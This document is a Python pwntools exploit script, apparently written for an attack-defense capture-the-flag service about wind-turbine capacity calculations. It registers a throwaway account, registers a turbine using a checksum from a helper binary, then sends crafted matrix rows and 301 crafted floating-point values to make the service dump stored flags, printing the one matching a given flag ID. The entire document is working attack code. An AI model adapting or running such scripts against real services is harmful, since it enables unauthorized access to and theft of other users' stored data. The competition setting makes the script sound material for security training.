#!/usr/bin/python3

from pwn import * 
from winds_of_the_past import *

def exploit(ip:str,flag_id:str):
    context.timeout = 5
    r = remote(ip,PORT)

    username = randoms(64, string.ascii_lowercase + string.digits + "-")
    password = randoms(64, string.ascii_lowercase + string.digits + "-")

    description = b"a"
    modelnumber = b"1"

    average_wind_velocity = b"12.52"
    num_turbines = b"1"

    r.sendline(Menu.REGISTER_USER.value)
    r.sendline(username.encode())
    r.sendline(password.encode())

    response = r.recvuntil(Menu.MENU_END.value)

    resp = r.recvuntil(b"2. Login")
    r.sendline(Menu.LOGIN.value)
    r.sendline(username.encode())
    r.sendline(password.encode())

    response = r.recvuntil(Menu.MENU_END.value)
    r.sendline(Menu.REGISTER_TURBINE.value)
    response = r.recvuntil(Menu.MENU_END.value)
    response = r.recvline()

    m = re.match(b"UUID is: ([a-z0-9-]+)\r\n", response)
    turbine_id = m.group(1).decode()
    checksum = subprocess.check_output(["./exploit2_checksum", turbine_id, modelnumber.decode()])

    response = r.recvuntil(b"Description: ")
    description = randoms(42, string.ascii_lowercase + string.digits + "-")
    r.sendline(description.encode())

    response = r.recvuntil(b"Model number: ")
    r.sendline(modelnumber)

    response = r.recvuntil(b"Checksum: ")
    r.sendline(checksum)
    response = r.recvuntil(Menu.MENU_END.value)

    r.sendline(Menu.CALCULATE_CAPACITY.value)
    r.sendline(average_wind_velocity)
    r.sendline(num_turbines)
    r.sendline(turbine_id.encode())
    r.sendline(checksum)

    # #real max eigenvalue
    r.sendline(b"12323.12341234552 95498912.3352212 9688923.21234123")
    r.sendline(b"212342789.1123452 1412.12342134 5.51251234")
    r.sendline(b"35252.1234442 22123.252525 3231.251234")

    for i in range(0,3):
      r.sendline(b"-12341234")

    r.sendline(Menu.CALCULATE_CAPACITY.value)
    r.sendline(average_wind_velocity)
    r.sendline(num_turbines)
    r.sendline(turbine_id.encode())
    r.sendline(checksum)

    response = r.recvuntil(Menu.MENU_END.value)

    r.sendline(b"1 2 3")
    r.sendline(b"4 5 6")
    r.sendline(b"7 8 9")

    for i in range(0,301):
        r.recvuntil(b": ")
        val = str(struct.unpack('!d', bytes.fromhex('0000000000405904'))[0]).encode("utf-8")
        r.sendline(val)
    response = r.recvall()
    for line in response.split(b"\r\n"):
        if line.count(b": ") == 1:
            line_flag_id, line_flag = line.split(b": ")
            if line_flag_id.decode() == flag_id:
                print(line_flag.decode())
    
if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.stderr.write(f"Usage: {sys.argv[0]} IP FlagID\n")
        sys.exit(1)

    exploit(sys.argv[1],sys.argv[2])

